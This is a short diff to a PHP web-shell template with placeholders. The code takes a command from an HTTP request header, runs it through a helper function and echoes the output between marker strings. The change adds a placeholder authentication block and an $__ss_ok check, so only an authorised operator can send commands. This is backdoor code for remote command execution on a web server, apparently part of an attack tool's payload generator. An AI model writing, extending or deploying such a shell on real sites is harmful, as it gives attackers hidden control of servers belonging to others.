@@ -4,6 +4,7 @@ function __ss_run($__ss_cmd) {
 }
 $__ss_key = "HTTP_" . strtoupper(str_replace("-", "_", "{{param_name}}"));
 $__ss_cmd = isset($_SERVER[$__ss_key]) ? $_SERVER[$__ss_key] : "";
-if ($__ss_cmd !== "") {
+{{auth_block}}
+if ($__ss_ok && $__ss_cmd !== "") {
     echo "{{response_begin}}" . __ss_run($__ss_cmd) . "{{response_end}}";
 }
